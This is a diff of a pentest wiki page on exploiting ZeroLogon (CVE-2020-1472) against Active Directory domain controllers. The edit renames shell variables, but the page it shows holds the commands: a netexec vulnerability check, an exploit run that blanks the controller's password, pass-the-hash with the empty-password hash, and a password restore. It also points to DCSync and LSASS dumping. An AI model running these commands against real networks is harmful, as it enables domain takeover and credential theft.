@@ -36,13 +36,13 @@ To check if a domain controller is vulnerable to ZeroLogon, you can use either [
 
 ```bash
 # You don't need to be authenticated on the domain.
-nxc smb $dc_ip -M zerologon
+nxc smb $DomainControllerIP -M zerologon
 ```
 
 If the domain controller appears to be vulnerable, you can attempt the exploit with this [dirkjanm's GitHub repository](https://github.com/dirkjanm/CVE-2020-1472).
 
 ```bash
-python3 cve-202-1472-exploit.py $dc_hostname $dc_ip
+python3 cve-202-1472-exploit.py $DomainControllerHostname $DomainControllerIP
 ```
 
 This will set the **domain controller's account password as empty**. So you are now able to do [Pass the Hash](/ad/passthehash/) with the following one `:31d6cfe0d16ae931b73c59d7e0c089c0` which corresponds to an empty password, or by using `-no-pass`-ish argument. The best option at this point is to perform [DCSync](/ad/dcsync/) attack.
@@ -50,13 +50,14 @@ This will set the **domain controller's account password as empty**. So you are 
 As explained in [dirkjanm's GitHub repository](https://github.com/dirkjanm/CVE-2020-1472), if you have a recent version of `impacket-secretsdump`, you should be able extract the `hex_plain_text` version of domain controller's previous password. If not, you can still retrieve it by [dumping LSASS cached credentials](/windows/credentials/#lsass-credentials). Once you have it, **don't forget** to put the previous password back.
 
 ```bash
-python3 restorepassword.py $domain/$dc_hostname@$dc_hostname -target-ip $dc_ip -hexpass $hex_plain_text
+# Don't put the trailing `$` at the end of domain controller hostname.
+python3 restorepassword.py $Domain/$DomainControllerHostname@$DomainControllerHostname -target-ip $DomainControllerIP -hexpass $HexPlainText
 ```
 
 To be sure, check the password is not empty anymore. Following command should fail.
 
 ```bash
-nxc smb $dc_ip -u "$dc_hostname$" -H '31d6cfe0d16ae931b73c59d7e0c089c0'
+nxc smb $DomainControllerIP -u "$DomainControllerHostname$" -H '31d6cfe0d16ae931b73c59d7e0c089c0'
 ```
 
 ## Recommendations
